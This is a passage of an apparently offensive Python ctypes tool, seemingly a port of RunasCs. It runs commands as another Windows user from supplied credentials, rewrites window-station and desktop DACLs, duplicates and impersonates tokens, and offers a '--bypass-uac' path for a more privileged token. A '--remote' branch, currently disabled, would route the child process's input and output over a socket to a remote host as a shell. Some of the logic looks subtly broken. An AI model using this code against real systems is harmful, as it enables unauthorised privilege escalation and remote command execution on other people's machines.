        if not AddAce(ctypes.byref(pDacl), ctypes.wintypes.DWORD(ACL_REVISION), ctypes.wintypes.DWORD(MAXDWORD), ctypes.byref(pNewAcePtr), ctypes.wintypes.DWORD(aceSize)):
            raise ValueError("AddAce true")

    def AddAceToWindowStation(self):
        pSd = ctypes.c_void_p(0)
        pDacl = ctypes.c_void_p(0)
        AccessMask = ACCESS_MASK()
        cbSd = ctypes.wintypes.DWORD(0)
        fDaclExist = ctypes.c_bool(False)
        fDaclPresent = ctypes.c_bool(False)
        aclSizeInfo = ACL_SIZE_INFORMATION()
        si = SECURITY_INFORMATION().DACL_SECURITY_INFORMATION
        if not GetUserObjectSecurity(ctypes.wintypes.HANDLE(self.hWinsta), ctypes.byref(si), ctypes.byref(pSd), ctypes.wintypes.DWORD(0), ctypes.byref(cbSd)):
            if ctypes.GetLastError() != ERROR_INSUFFICIENT_BUFFER:
                raise ValueError(f"GetUserObjectSecurity 1 size true")
        pSd = (ctypes.c_ubyte * cbSd.value)()
        if not GetUserObjectSecurity(ctypes.wintypes.HANDLE(self.hWinsta), ctypes.byref(si), ctypes.byref(pSd), cbSd, ctypes.byref(cbSd)):
            raise ValueError(f"GetUserObjectSecurity 2 true")
        if not GetSecurityDescriptorDacl(ctypes.byref(pSd), ctypes.byref(fDaclPresent), ctypes.byref(pDacl), ctypes.byref(fDaclExist)):
            raise ValueError(f"GetSecurityDescriptorDacl true")
        if not pDacl:
            cbDacl = 0
        else:
            if not GetAclInformation(pDacl, ctypes.byref(aclSizeInfo), ctypes.wintypes.DWORD(ctypes.sizeof(aclSizeInfo)), ACL_INFORMATION_CLASS().AclSizeInformation):
                raise ValueError(f"GetAclInformation true")
            cbDacl = aclSizeInfo.AclBytesInUse
        pNewSd = (ctypes.c_byte * cbSd.value )()
        if not InitializeSecurityDescriptor(ctypes.byref(pNewSd), ctypes.wintypes.DWORD(SECURITY_DESCRIPTOR_REVISION)):
            raise ValueError(f"InitializeSecurityDescriptor true")
        cbNewAce = ctypes.sizeof(ACCESS_ALLOWED_ACE) + GetLengthSid(self.userSid) - ctypes.sizeof(ctypes.c_uint)
        if not cbDacl:
            cbNewDacl = 8 + (cbNewAce*2)
        else:
            cbNewDacl = cbDacl + (cbNewAce*2)
        pNewDacl = (ctypes.c_byte * cbNewDacl)()
        if not InitializeAcl(ctypes.byref(pNewDacl), ctypes.wintypes.DWORD(cbNewDacl), ctypes.wintypes.DWORD(ACL_REVISION)):
            raise ValueError(f"InitializeAcl true")
        if fDaclPresent:
            for dwIndex in range(0, aclSizeInfo.AceCount):
                pTempAce = ctypes.c_void_p(0)
                if not GetAce(pDacl, ctypes.wintypes.DWORD(dwIndex), ctypes.byref(pTempAce)):
                    raise ValueError(f"GetAce true")
                pTempAceStruct = ctypes.cast(pTempAce, ctypes.POINTER(ACE_HEADER))
                if not AddAce(ctypes.byref(pNewDacl), ctypes.wintypes.DWORD(ACL_REVISION), ctypes.wintypes.DWORD(MAXDWORD), pTempAce, ctypes.wintypes.DWORD(pTempAceStruct.contents.AceSize)):
                    raise ValueError("AddAce true")
        self.AddAllowedAceToDACL(pNewDacl, AccessMask.GENERIC_ACCESS, (CONTAINER_INHERIT_ACE | INHERIT_ONLY_ACE | OBJECT_INHERIT_ACE), cbNewAce)
        self.AddAllowedAceToDACL(pNewDacl, AccessMask.WINSTA_ALL, NO_PROPAGATE_INHERIT_ACE, cbNewAce)
        if not SetSecurityDescriptorDacl(ctypes.byref(pNewSd), ctypes.c_bool(True), ctypes.byref(pNewDacl), ctypes.c_bool(False)):
            raise ValueError("SetSecurityDescriptorDacl true")
        if not SetUserObjectSecurity(ctypes.wintypes.HANDLE(self.hWinsta), ctypes.byref(si), ctypes.byref(pNewSd)):
            raise ValueError("SetUserObjectSecurity true")


    def AddAceToDesktop(self):
        pSd = ctypes.c_void_p(0)
        pDacl = ctypes.c_void_p(0)
        AccessMask = ACCESS_MASK()
        cbSd = ctypes.wintypes.DWORD(0)
        fDaclExist = ctypes.c_bool(False)
        fDaclPresent = ctypes.c_bool(False)
        aclSizeInfo = ACL_SIZE_INFORMATION()
        si = SECURITY_INFORMATION().DACL_SECURITY_INFORMATION
        if not GetUserObjectSecurity(ctypes.wintypes.HANDLE(self.hDesktop), ctypes.byref(si), ctypes.byref(pSd), ctypes.wintypes.DWORD(0), ctypes.byref(cbSd)):
            if ctypes.GetLastError() != ERROR_INSUFFICIENT_BUFFER:
                raise ValueError(f"GetUserObjectSecurity 1 size true")
        pSd = (ctypes.c_ubyte * cbSd.value)()
        if not GetUserObjectSecurity(ctypes.wintypes.HANDLE(self.hDesktop), ctypes.byref(si), ctypes.byref(pSd), cbSd, ctypes.byref(cbSd)):
            raise ValueError(f"GetUserObjectSecurity 2 true")
        if not GetSecurityDescriptorDacl(ctypes.byref(pSd), ctypes.byref(fDaclPresent), ctypes.byref(pDacl), ctypes.byref(fDaclExist)):
            raise ValueError(f"GetSecurityDescriptorDacl true")
        if not pDacl:
            cbDacl = 0
        else:
            if not GetAclInformation(pDacl, ctypes.byref(aclSizeInfo), ctypes.wintypes.DWORD(ctypes.sizeof(aclSizeInfo)), ACL_INFORMATION_CLASS().AclSizeInformation):
                raise ValueError(f"GetAclInformation true")
            cbDacl = aclSizeInfo.AclBytesInUse
        pNewSd = (ctypes.c_byte * cbSd.value )()
        if not InitializeSecurityDescriptor(ctypes.byref(pNewSd), ctypes.wintypes.DWORD(SECURITY_DESCRIPTOR_REVISION)):
            raise ValueError(f"InitializeSecurityDescriptor true")
        cbNewAce = ctypes.sizeof(ACCESS_ALLOWED_ACE) + GetLengthSid(self.userSid) - ctypes.sizeof(ctypes.c_uint)
        if not cbDacl:
            cbNewDacl = 8 + cbNewAce
        else:
            cbNewDacl = cbDacl + cbNewAce
        pNewDacl = (ctypes.c_byte * cbNewDacl)()
        if not InitializeAcl(ctypes.byref(pNewDacl), ctypes.wintypes.DWORD(cbNewDacl), ctypes.wintypes.DWORD(ACL_REVISION)):
            raise ValueError(f"InitializeAcl true")
        if fDaclPresent:
            for dwIndex in range(0, aclSizeInfo.AceCount):
                pTempAce = ctypes.c_void_p(0)
                if not GetAce(pDacl, ctypes.wintypes.DWORD(dwIndex), ctypes.byref(pTempAce)):
                    raise ValueError(f"GetAce true")
                pTempAceStruct = ctypes.cast(pTempAce, ctypes.POINTER(ACE_HEADER))
                if not AddAce(ctypes.byref(pNewDacl), ctypes.wintypes.DWORD(ACL_REVISION), ctypes.wintypes.DWORD(MAXDWORD), pTempAce, ctypes.wintypes.DWORD(pTempAceStruct.contents.AceSize)):
                    raise ValueError("AddAce true")
        if not AddAccessAllowedAce(ctypes.byref(pNewDacl), ctypes.wintypes.DWORD(ACL_REVISION), ctypes.wintypes.DWORD(AccessMask.DESKTOP_ALL), self.userSid):
            raise ValueError(f"AddAccessAllowedAce true")
        if not SetSecurityDescriptorDacl(ctypes.byref(pNewSd), ctypes.c_bool(True), ctypes.byref(pNewDacl), ctypes.c_bool(False)):
            raise ValueError(f"SetSecurityDescriptorDacl true")
        if not SetUserObjectSecurity(ctypes.wintypes.HANDLE(self.hDesktop), ctypes.byref(si), ctypes.byref(pNewSd)):
            raise ValueError(f"SetUserObjectSecurity true")


    def AddAce(self, target):
        if target not in self.__dict__:
            raise ValueError(f"{target} not an attribute of WinStationDACL object")
        pSd = ctypes.c_void_p(0)
        pDacl = ctypes.c_void_p(0)
        AccessMask = ACCESS_MASK()
        cbSd = ctypes.wintypes.DWORD(0)
        fDaclExist = ctypes.c_bool(False)
        fDaclPresent = ctypes.c_bool(False)
        aclSizeInfo = ACL_SIZE_INFORMATION()
        si = SECURITY_INFORMATION().DACL_SECURITY_INFORMATION
        if not GetUserObjectSecurity(ctypes.wintypes.HANDLE(self.__dict__[target]), ctypes.byref(si), ctypes.byref(pSd), ctypes.wintypes.DWORD(0), ctypes.byref(cbSd)):
            if ctypes.GetLastError() != ERROR_INSUFFICIENT_BUFFER:
                raise ValueError(f"GetUserObjectSecurity 1 size true")
        pSd = (ctypes.c_ubyte * cbSd.value)()
        if not GetUserObjectSecurity(ctypes.wintypes.HANDLE(self.__dict__[target]), ctypes.byref(si), ctypes.byref(pSd), cbSd, ctypes.byref(cbSd)):
            raise ValueError(f"GetUserObjectSecurity 2 true")
        if not GetSecurityDescriptorDacl(ctypes.byref(pSd), ctypes.byref(fDaclPresent), ctypes.byref(pDacl), ctypes.byref(fDaclExist)):
            raise ValueError(f"GetSecurityDescriptorDacl true")
        if not pDacl:
            cbDacl = 0
        else:
            if not GetAclInformation(pDacl, ctypes.byref(aclSizeInfo), ctypes.wintypes.DWORD(ctypes.sizeof(aclSizeInfo)), ACL_INFORMATION_CLASS().AclSizeInformation):
                raise ValueError(f"GetAclInformation true")
            cbDacl = aclSizeInfo.AclBytesInUse
        pNewSd = (ctypes.c_byte * cbSd.value )()
        if not InitializeSecurityDescriptor(ctypes.byref(pNewSd), ctypes.wintypes.DWORD(SECURITY_DESCRIPTOR_REVISION)):
            raise ValueError(f"InitializeSecurityDescriptor true")
        cbNewAce = ctypes.sizeof(ACCESS_ALLOWED_ACE) + GetLengthSid(self.userSid) - ctypes.sizeof(ctypes.c_uint)
        if not cbDacl:
            cbNewDacl = 8 + ((cbNewAce*2) if target == "hWinsta" else cbNewAce)
        else:
            cbNewDacl = cbDacl + ((cbNewAce*2) if target == "hWinsta" else cbNewAce)
        pNewDacl = (ctypes.c_byte * cbNewDacl)()
        if not InitializeAcl(ctypes.byref(pNewDacl), ctypes.wintypes.DWORD(cbNewDacl), ctypes.wintypes.DWORD(ACL_REVISION)):
            raise ValueError(f"InitializeAcl true")
        if fDaclPresent:
            for dwIndex in range(0, aclSizeInfo.AceCount):
                pTempAce = ctypes.c_void_p(0)
                if not GetAce(pDacl, ctypes.wintypes.DWORD(dwIndex), ctypes.byref(pTempAce)):
                    raise ValueError(f"GetAce true")
                pTempAceStruct = ctypes.cast(pTempAce, ctypes.POINTER(ACE_HEADER))
                if not AddAce(ctypes.byref(pNewDacl), ctypes.wintypes.DWORD(ACL_REVISION), ctypes.wintypes.DWORD(MAXDWORD), pTempAce, ctypes.wintypes.DWORD(pTempAceStruct.contents.AceSize)):
                    raise ValueError("AddAce true")
        if target == "hWinsta":
            self.AddAllowedAceToDACL(pNewDacl, AccessMask.GENERIC_ACCESS, (CONTAINER_INHERIT_ACE | INHERIT_ONLY_ACE | OBJECT_INHERIT_ACE), cbNewAce)
            self.AddAllowedAceToDACL(pNewDacl, AccessMask.WINSTA_ALL, NO_PROPAGATE_INHERIT_ACE, cbNewAce)
        elif target == "hDesktop":
            if not AddAccessAllowedAce(ctypes.byref(pNewDacl), ctypes.wintypes.DWORD(ACL_REVISION), ctypes.wintypes.DWORD(AccessMask.DESKTOP_ALL), self.userSid):
                raise ValueError("AddAccessAllowedAce true")
        if not SetSecurityDescriptorDacl(ctypes.byref(pNewSd), ctypes.c_bool(True), ctypes.byref(pNewDacl), ctypes.c_bool(False)):
            raise ValueError("SetSecurityDescriptorDacl true")
        if not SetUserObjectSecurity(ctypes.wintypes.HANDLE(self.__dict__[target]), ctypes.byref(si), ctypes.byref(pNewSd)):
            raise ValueError("SetUserObjectSecurity true")


    def AddAclToActiveWindowStation(self, domain, username, logonType):
        desktop = ctypes.create_string_buffer(b"Default", 8)
        lengthNeeded = ctypes.wintypes.DWORD(0)
        hWinstaSave = GetProcessWindowStation()
        stationNameBytes = (ctypes.c_byte * 256)()
        if not hWinstaSave:
            raise ValueError(f"GetProcessWindowStation true")
        if not GetUserObjectInformation(ctypes.wintypes.HANDLE(hWinstaSave), ctypes.c_int(UOI_NAME), ctypes.byref(stationNameBytes), ctypes.wintypes.DWORD(256), ctypes.byref(lengthNeeded)):
            raise ValueError(f"GetUserObjectInformation true")
        stationName = bytes(stationNameBytes)[:lengthNeeded.value - 1]
        if logonType != 9:
            self.hWinsta = OpenWindowStation(stationName, ctypes.c_bool(False), (READ_CONTROL | WRITE_DAC))
            if not self.hWinsta:
                raise ValueError("OpenWindowStation true")
            if not SetProcessWindowStation(ctypes.wintypes.HANDLE(self.hWinsta)):
                raise ValueError("SetProcessWindowStation hWinsta true")
            self.hDesktop = OpenDesktop(ctypes.byref(desktop), ctypes.wintypes.DWORD(0), ctypes.c_bool(False), ctypes.wintypes.DWORD(READ_CONTROL | WRITE_DAC | DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS))
            if not SetProcessWindowStation(ctypes.wintypes.HANDLE(hWinstaSave)):
                raise ValueError("SetProcessWindowStation hWinstaSave true")
            if not self.hWinsta:
                raise ValueError("OpenDesktop true")
            self.userSid = GetUserSid(domain, username)
            # self.AddAceToWindowStation()
            # self.AddAceToDesktop()
            self.AddAce('hWinsta')
            self.AddAce('hDesktop')
        return stationName + b"\\Default"

class RunAsPy():
    def __init__(self):
        self.hOutputRead = ctypes.c_void_p()
        self.hOutputWrite = ctypes.c_void_p()
        self.hErrorWrite = ctypes.c_void_p()
        self.socket = ctypes.c_void_p()
        self.stationDaclObj = None
        self.hTokenPreviousImpersonatingThread = ctypes.c_void_p()

    def ImpersonateLoggedOnUserWithProperIL(self, hToken):
        TokenImpersonation = 2
        hTokenDuplicateLocal = ctypes.c_void_p(0)
        result = False
        pHandle = ctypes.wintypes.HANDLE(0)
        current_thread = GetCurrentThread()
        if not OpenThreadToken(ctypes.wintypes.HANDLE(current_thread), ctypes.wintypes.DWORD(AccessToken.TOKEN_QUERY), ctypes.c_bool(False), ctypes.byref(pHandle)):
            if ctypes.GetLastError() != ERROR_NO_TOKEN:
                raise ValueError("Failed to obtain token")
        else:
            self.hTokenPreviousImpersonatingThread = pHandle
        if not DuplicateTokenEx(hToken, ctypes.wintypes.DWORD(AccessToken.TOKEN_ALL_ACCESS), ctypes.c_void_p(0), SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, ctypes.c_int(TokenImpersonation), ctypes.byref(hTokenDuplicateLocal)):
            raise ValueError(f"DuplicateTokenEx true")
        pToken = ctypes.wintypes.HANDLE(0)
        if not OpenProcessToken(ctypes.wintypes.HANDLE(-1), ctypes.wintypes.DWORD(AccessToken.TOKEN_QUERY), ctypes.byref(pToken)):
            raise ValueError("Failed to obtain token")
        if AccessToken.GetTokenIntegrityLevel(pToken) < AccessToken.GetTokenIntegrityLevel(hTokenDuplicateLocal):
            AccessToken.SetTokenIntegrityLevel(hTokenDuplicateLocal, AccessToken.GetTokenIntegrityLevel(pToken))
        result = ImpersonateLoggedOnUser(hTokenDuplicateLocal)
        return hTokenDuplicateLocal.value

    def IsLimitedUserLogon(self, hToken, username, domainName, password, logonTypeNotFiltered):
        isLimitedUserLogon = False
        isTokenUACFiltered = AccessToken.IsFilteredUACToken(hToken)
        hTokenNetwork = ctypes.c_void_p(0)
        hTokenService = ctypes.c_void_p(0)
        hTokenBatch = ctypes.c_void_p(0)
        if isTokenUACFiltered:
            logonTypeNotFiltered = LOGON32_LOGON_NETWORK_CLEARTEXT
            isLimitedUserLogon = True
        else:
            userTokenIL = AccessToken.GetTokenIntegrityLevel(hToken)
            if LogonUser(username, domainName, password, LOGON32_LOGON_NETWORK_CLEARTEXT, LOGON32_PROVIDER_DEFAULT, ctypes.byref(hTokenNetwork)) and userTokenIL < AccessToken.GetTokenIntegrityLevel(hTokenNetwork.value):
                isLimitedUserLogon = True
                logonTypeNotFiltered = LOGON32_LOGON_NETWORK_CLEARTEXT.value
            elif not isLimitedUserLogon and LogonUser(username, domainName, password, LOGON32_LOGON_SERVICE, LOGON32_PROVIDER_DEFAULT, ctypes.byref(hTokenNetwork)) and userTokenIL < AccessToken.GetTokenIntegrityLevel(hTokenService):
                isLimitedUserLogon = True
                logonTypeNotFiltered = LOGON32_LOGON_SERVICE
            elif not isLimitedUserLogon and LogonUser(username, domainName, password, LOGON32_LOGON_BATCH, LOGON32_PROVIDER_DEFAULT, ctypes.byref(hTokenBatch)) and userTokenIL < AccessToken.GetTokenIntegrityLevel(hTokenBatch):
                isLimitedUserLogon = True
                logonTypeNotFiltered = LOGON32_LOGON_BATCH
            if hTokenNetwork.value:
                CloseHandle(hTokenNetwork)
            if hTokenService.value:
                CloseHandle(hTokenService)
            if hTokenBatch.value:
                CloseHandle(hTokenBatch)
        return isLimitedUserLogon

    def IsUserProfileCreated(self, username, password, domainName, logonType):
        result = False
        hToken = ctypes.c_void_p(0)
        logonProvider = LOGON32_PROVIDER_DEFAULT
        if logonType == LOGON32_LOGON_NEW_CREDENTIALS:
            logonProvider = LOGON32_PROVIDER_WINNT50
        result = LogonUser(ctypes.byref(username), ctypes.byref(domainName), ctypes.byref(password), ctypes.wintypes.DWORD(logonType), logonProvider, ctypes.byref(hToken))
        if not result:
            raise ValueError("LogonUser true")
        hTokenDuplicate = self.ImpersonateLoggedOnUserWithProperIL(hToken)
        try:
            dwSize = ctypes.wintypes.DWORD(0)
            profileDir = ctypes.wintypes.LPSTR(b"")
            GetUserProfileDirectory(hToken, profileDir, ctypes.byref(dwSize))
            profileDir = (ctypes.c_byte * dwSize.value)()
            result = GetUserProfileDirectory(hToken, profileDir, ctypes.byref(dwSize))
        except:
            result = False
        return result

    def CreateProcessWithLogonWUacBypass(self, logonType, logonFlags, username, domainName, password, processPath, commandLine, startupInfo, processInfo):
        result = False
        hToken = ctypes.c_void_p(0)
        pToken = ctypes.wintypes.HANDLE(0)
        if not LogonUserW(username, domainName, password, ctypes.wintypes.DWORD(logonType), LOGON32_PROVIDER_DEFAULT, ctypes.byref(hToken)):
            raise ValueError("CreateProcessWithLogonWUacBypass: LogonUser true")
        if not OpenProcessToken(ctypes.wintypes.HANDLE(-1), ctypes.wintypes.DWORD(AccessToken.TOKEN_QUERY), ctypes.byref(pToken)):
            raise ValueError("Failed to obtain token")
        AccessToken.SetTokenIntegrityLevel(hToken, AccessToken.GetTokenIntegrityLevel(pToken))
        SetSecurityInfo(ctypes.wintypes.HANDLE(-1), SE_OBJECT_TYPE.SE_KERNEL_OBJECT, SECURITY_INFORMATION().DACL_SECURITY_INFORMATION, ctypes.c_void_p(0), ctypes.c_void_p(0), ctypes.c_void_p(0), ctypes.c_void_p(0))
        result = CreateProcessWithLogonW(username, domainName, password, ctypes.wintypes.DWORD(logonFlags.value | LOGON_NETCREDENTIALS_ONLY), ctypes.c_void_p(processPath), commandLine, ctypes.c_void_p(CREATE_NO_WINDOW), ctypes.c_void_p(0), ctypes.c_void_p(0), ctypes.byref(startupInfo), ctypes.byref(processInfo))
        return result

    def ReadOutputFromPipe(self, hReadPipe):
        dwBytesRead = ctypes.wintypes.DWORD(0)
        buffer = (ctypes.c_byte * BUFFER_SIZE_PIPE)()
        output = ""
        if not ReadFile(hReadPipe, ctypes.byref(buffer), ctypes.wintypes.DWORD(BUFFER_SIZE_PIPE), ctypes.byref(dwBytesRead), ctypes.c_void_p(0)):
            output += "No output received from the process.\n"
        output += bytes(buffer[:dwBytesRead.value - 1]).decode()
        return output

    def RunasCreateProcessWithLogonW(self, username, domainName, password, logonType, logonFlags, commandLine, bypassUac, startupInfo, processInfo, logonTypeNotFiltered):
        domainName_buffer = ctypes.create_string_buffer(bytes(domainName.encode()), len(domainName) + 1)
        username_buffer = ctypes.create_string_buffer(bytes(username.encode()), len(username) + 1)
        password_buffer = ctypes.create_string_buffer(bytes(password.encode()), len(password) + 1)
        commandLine_buffer = ctypes.create_string_buffer(bytes(commandLine.encode()), len(commandLine) + 1)
        username = ctypes.wintypes.LPCWSTR(username)
        domainName = ctypes.wintypes.LPCWSTR(domainName)
        password = ctypes.wintypes.LPCWSTR(password)
        commandLine = ctypes.wintypes.LPCWSTR(commandLine)
        if logonType == LOGON32_LOGON_NEW_CREDENTIALS.value:
            if not CreateProcessWithLogonW(username, domainName, password, ctypes.wintypes.DWORD(LOGON_NETCREDENTIALS_ONLY), ctypes.c_void_p(0), commandLine, ctypes.c_void_p(CREATE_NO_WINDOW), ctypes.c_uint32(0), ctypes.c_void_p(0), ctypes.byref(startupInfo), ctypes.byref(processInfo)):
                raise ValueError(f"CreateProcessWithLogonW logon type 9 true")
        elif bypassUac:
            if logonType in [LOGON32_LOGON_NETWORK.value, LOGON32_LOGON_BATCH.value, LOGON32_LOGON_SERVICE.value, LOGON32_LOGON_NETWORK_CLEARTEXT.value]:
                logonTypeBypassUac = logonType
            else:
                logonTypeBypassUac = LOGON32_LOGON_NETWORK_CLEARTEXT.value
            if not self.CreateProcessWithLogonWUacBypass(logonTypeBypassUac, logonFlags, username, domainName, password, None, commandLine, startupInfo, processInfo):
                raise ValueError(f"CreateProcessWithLogonUacBypass true")
        else:
            hTokenUacCheck = ctypes.c_void_p(0)
            if logonType != LOGON32_LOGON_INTERACTIVE.value:
                print(f"[*] Warning: The function CreateProcessWithLogonW is not compatible with the requested logon type '{ logonType }'. Reverting to the Interactive logon type '2'. To force a specific logon type, use the flag combination --remote-impersonation and --logon-type.")
            CheckAvailableUserLogonType(username_buffer, password_buffer, domainName_buffer, LOGON32_LOGON_INTERACTIVE.value, LOGON32_PROVIDER_DEFAULT)
            if not LogonUser(ctypes.byref(username_buffer), ctypes.byref(domainName_buffer), ctypes.byref(password_buffer), LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, ctypes.byref(hTokenUacCheck)):
                raise ValueError("LogonUser true")
            if self.IsLimitedUserLogon(hTokenUacCheck, username_buffer, domainName_buffer, password_buffer, logonTypeNotFiltered):
                print(f"[*] Warning: The logon for user '{ username.value }' is limited. Use the flag combination --bypass-uac and --logon-type '{ logonTypeNotFiltered }' to obtain a more privileged token.")
            CloseHandle(hTokenUacCheck)
            if not CreateProcessWithLogonW(username, domainName, password, logonFlags, ctypes.c_void_p(0), commandLine, ctypes.c_void_p(CREATE_NO_WINDOW), ctypes.c_uint32(0), ctypes.c_void_p(0), ctypes.byref(startupInfo), ctypes.byref(processInfo)):
                raise ValueError(f"CreateProcessWithLogonW logon type 2 true")

    
    def RunasSetupStdHandlesForProcess(self, processTimeout, remote, startupInfo, hOutputWrite, hErrorWrite, hOutputRead, socket):
        self.hOutputWrite = ctypes.c_void_p(0)
        self.hErrorWrite = ctypes.c_void_p(0)
        self.hOutputRead = ctypes.c_void_p(0)
        hOutputReadTmpLocal = ctypes.c_void_p(0)
        self.socket = ctypes.c_void_p(0)
        if processTimeout > 0:
            hCurrentProcess = ctypes.wintypes.HANDLE(-1)
            if not CreateAnonymousPipeEveryoneAccess(hOutputReadTmpLocal, self.hOutputWrite):
                raise ValueError("CreatePipe true") # come back to this
            if not DuplicateHandle(hCurrentProcess, self.hOutputWrite, hCurrentProcess, ctypes.byref(self.hErrorWrite), ctypes.wintypes.DWORD(0), True, DUPLICATE_SAME_ACCESS):
                raise ValueError("DuplicateHandle stderr write pipe true")
            if not DuplicateHandle(hCurrentProcess, hOutputReadTmpLocal, hCurrentProcess, ctypes.byref(self.hOutputRead), ctypes.wintypes.DWORD(0), False, DUPLICATE_SAME_ACCESS):
                raise ValueError("DuplicateHandle stdout read pipe true")
            CloseHandle(hOutputReadTmpLocal)
            hOutputReadTmpLocal = ctypes.c_void_p(0)
            PIPE_NOWAIT = ctypes.wintypes.DWORD(0x00000001)
            if not SetNamedPipeHandleState(self.hOutputRead, ctypes.byref(PIPE_NOWAIT), ctypes.c_void_p(0), ctypes.c_void_p(0)):
                raise ValueError("SetNamedPipeHandleState true")
            startupInfo.dwFlags = Startf_UseStdHandles
            startupInfo.hStdOutput = self.hOutputWrite
            startupInfo.hStdError = self.hErrorWrite
        elif remote != None:
            self.socket = ConnectRemote(remote)
            startupInfo.dwFlags = Startf_UseStdHandles
            startupInfo.hStdInput = socket
            startupInfo.hStdOutput = self.socket
            startupInfo.hStdError = self.socket
            raise ValueError("Remote not currently supported")

    def RunAs(self, username, password, cmd, domainName, processTimeout, logonType, createProcessFunction, remote, forceUserProfileCreation, bypassUac, remoteImpersonation):
        if not domainName:
            domainName = "."
        username_buffer = ctypes.create_string_buffer(bytes(username.encode()), len(username) + 1)
        password_buffer = ctypes.create_string_buffer(bytes(password.encode()), len(password) + 1)
        commandLine = ParseCommonProcessInCommandline(cmd)
        logonProvider = LOGON32_PROVIDER_DEFAULT
        logonTypeNotFiltered = 0
        startupInfo = STARTUPINFO()
        startupInfo.cb = ctypes.sizeof(startupInfo)
        processInfo = PROCESS_INFORMATION()
        self.RunasSetupStdHandlesForProcess(processTimeout, remote, startupInfo, self.hOutputWrite, self.hErrorWrite, self.hOutputRead, self.socket)
        self.stationDaclObj = WindowStationDACL()
        desktopName = self.stationDaclObj.AddAclToActiveWindowStation(domainName, username, logonType)
        startupInfo.lpDesktop = ctypes.wintypes.LPSTR(desktopName)
        if logonType == LOGON32_LOGON_NEW_CREDENTIALS.value:
            logonProvider = LOGON32_PROVIDER_WINNT50
            if not domainName:
                domainName = "."
        domainName_buffer = ctypes.create_string_buffer(bytes(domainName.encode()), len(domainName) + 1)
        CheckAvailableUserLogonType(username_buffer, password_buffer, domainName_buffer, logonType, logonProvider)
        if remoteImpersonation:
            RunasRemoteImpersonation(username, domainName, password, logonType, logonProvider, commandLine, startupInfo, processInfo, logonTypeNotFiltered)
        else:
            logonFlags = ctypes.c_uint32(0)
            userProfileExists = self.IsUserProfileCreated(username_buffer, password_buffer, domainName_buffer, logonType)
            if userProfileExists or forceUserProfileCreation:
                logonFlags = LOGON_WITH_PROFILE
            elif logonType != LOGON32_LOGON_NEW_CREDENTIALS.value and not forceUserProfileCreation and not userProfileExists:
                raise ValueError(f"[*] Warning: User profile directory for user { username } does not exist. Use --force-profile if you want to force the creation.")
            if createProcessFunction == 2:
                self.RunasCreateProcessWithLogonW(username, domainName, password, logonType, logonFlags, commandLine, bypassUac, startupInfo, processInfo, logonTypeNotFiltered)
            else:
                if bypassUac:
                    raise ValueError(f"The flag --bypass-uac is not compatible with {GetProcessFunction(createProcessFunction)} but only with --function '2' (CreateProcessWithLogonW)")
                if createProcessFunction == 0:
                    RunasCreateProcessAsUserW(username, domainName, password, logonType, logonFlags, commandLine, bypassUac, startupInfo, processInfo, logonTypeNotFiltered)
                elif createProcessFunction == 1:
                    RunasCreateProcessWithTokenW(username, domainName, password, logonType, logonFlags, commandLine, bypassUac, startupInfo, processInfo, logonTypeNotFiltered)
        #self.RunasCreateProcessWithLogonW(username, domainName, password, logonType, logonFlags, commandLine, bypassUac, startupInfo, processInfo, logonTypeNotFiltered) TESTING
        output = ""
        if processTimeout > 0:
            CloseHandle(self.hOutputWrite)
            CloseHandle(self.hErrorWrite)
            self.hOutputWrite = ctypes.wintypes.DWORD(0)
            self.hErrorWrite = ctypes.wintypes.DWORD(0)
            WaitForSingleObject(processInfo.process, processTimeout)
            output += f"\n{self.ReadOutputFromPipe(self.hOutputRead)}"
        else:
            sessionId = ctypes.wintypes.DWORD()
            hResult = ProcessIdToSessionId(ctypes.wintypes.DWORD(GetCurrentProcessId()), ctypes.byref(sessionId))
            if not hResult:
                raise SystemError(f"[!] Error encountered when obtaining session id: {hResult} ({ctypes.GetLastError()})")
            if remoteImpersonation:
                output += f"\n[+] Running in session { sessionId } with process function 'Remote Impersonation'\n"
            else:
                output += f"\n[+] Running in session { sessionId } with process function { GetProcessFunction(createProcessFunction)}\n"
            output += f"[+] Using Station\\Desktop: { desktopName }\n"
            output += f"[+] Async process '{ commandLine }' with pid { processInfo.processId } created in background.\n"
        CloseHandle(processInfo.process)
        CloseHandle(processInfo.thread)
        self.CleanupHandles()
        return output

    def CleanupHandles(self):
        if self.hOutputRead.value:
            CloseHandle(self.hOutputRead)
        if self.hOutputWrite.value:
            CloseHandle(self.hOutputWrite)
        if self.hErrorWrite:
            CloseHandle(self.hErrorWrite)
        if self.socket:
            closesocket(self.socket)
        self.hOutputRead = ctypes.c_void_p(0)
        self.hOutputWrite = ctypes.c_void_p(0)
        self.hErrorWrite = ctypes.c_void_p(0)
        self.socket = ctypes.c_void_p(0)
        self.hTokenPreviousImpersonatingThread = ctypes.c_void_p(0)
        self.stationDaclObj = None

def Runas(username=None, password=None, cmd=None, domainName=None, processTimeout=120000, logonType=2, createProcessFunction=0, remote=None, forceUserProfileCreation=False, bypassUac=False, remoteImpersonation=False):
    invoker = RunAsPy()
    try:
        output = invoker.RunAs(username, password, cmd, domainName, processTimeout, logonType, createProcessFunction, remote, forceUserProfileCreation, bypassUac, remoteImpersonation)
    except Exception as e:
        print(e)
        invoker.CleanupHandles()
        output = f"{e}"
    return output

parser = argparse.ArgumentParser(description="")
parser.add_argument('-d', '--domain', help="", nargs="?", dest="domainName")
parser.add_argument('-u', '--username', help="", nargs="?")
parser.add_argument('-P', '--password', help="", nargs="?")
parser.add_argument('-c', '--command', help="", nargs="?", dest="cmd")
parser.add_argument('-t', '--timeout', help="", nargs="?", default=120000, dest="processTimeout")
parser.add_argument('-l', '--logon-type', help="", nargs="?", default=2, dest="logonType")
parser.add_argument('-f', '--function', help="", nargs="?", dest="createProcessFunction", default=DefaultCreateProcessFunction())
parser.add_argument('-r', '--remote', help="", nargs="?", default=None)
parser.add_argument('-p', '--force-profile', help="", action="store_true", default=False, dest="forceUserProfileCreation")
parser.add_argument('-b', '--bypass-uac', help="", action="store_true", default=False, dest="bypassUac")
parser.add_argument('-i', '--remote-impersonation', help="", action="store_true", default=False, dest="remoteImpersonation")

args = parser.parse_args()

Runas(**args.__dict__)